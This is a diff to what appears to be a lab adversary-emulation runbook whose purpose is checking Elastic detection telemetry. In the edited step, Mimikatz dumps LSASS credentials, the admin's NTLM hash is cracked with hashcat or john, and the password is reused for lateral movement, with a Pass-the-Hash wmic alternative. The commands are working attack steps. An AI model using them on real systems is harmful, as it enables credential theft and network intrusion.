@@ -118,17 +118,26 @@ net use /delete \\FS01\IPC$
 ```
 `python scripts/lab_tools.py artifact-new ART-05-01 RUN-20260928-02 5 6 --payload stage/ws01/auth-bundle.json -o stage/ws01/art05_01.json`
 
-## 9. S7b — credential access (REAL Mimikatz; WS01; operator-driven)
+## 9. S7b — credential access (REAL LSASS dump → obtain → crack; WS01 + Kali)
 
 ```powershell
-# stage the real tool first
+# 1) stage the real tool + run the REAL dump (WS01; password at the runas prompt only)
 Copy-Item stage\ws01\mimikatz.exe \\WS01\C$\Tools\mimikatz.exe
-# harvest the it.admin session anchored in step 8; password at the runas prompt ONLY
 runas /user:C0015\it.admin "C:\Tools\mimikatz.exe sekurlsa::logonpasswords"
-# guardrail: output stays in the console; close the window; NEVER copy/pipe it to files/logs/repo
 ```
-Verify (Elastic): WS01 **S4648** (runas it.admin) + **E1 mimikatz.exe** (parent cmd) + **E10 ProcessAccess
-target lsass.exe** (real high GrantedAccess). Nothing in `c2sim.log` (this step is outside the beacon).
+2) In the console output, copy it.admin's line — it carries the **NTLM hash** (no plaintext on modern Windows).
+3) Crack it on KALI (transient file, delete after use):
+```bash
+echo -n '<NTLM_HASH>' > /tmp/itadmin.ntlm
+hashcat -m 1000 /tmp/itadmin.ntlm rockyou.txt --show     # or: john --format=nt /tmp/itadmin.ntlm
+rm -f /tmp/itadmin.ntlm
+```
+4) Use the **cracked plaintext** at the S8 `runas`/`wmic` prompt — the pivot credential now genuinely comes from
+   the dump (in-run only; never in repo/logs/ledger).
+Alternative (no crack): Pass-the-Hash on WS01 → `sekurlsa::pth /user:it.admin /domain:c0015.lab /ntlm:<hash>
+"cmd /c wmic /node:FS01 process call create ..."` (telemetry differs: no S4648; FS01 4624 from the forged logon).
+Verify (Elastic): WS01 S4648 (runas) + E1 mimikatz.exe (parent cmd) + E10 target lsass.exe; no mimikatz line in
+`c2sim.log`. Guardrail: close the runas windows after use; values live in operator memory only.
 
 ## 10. S8 — lateral (WS01 → FS01)
 
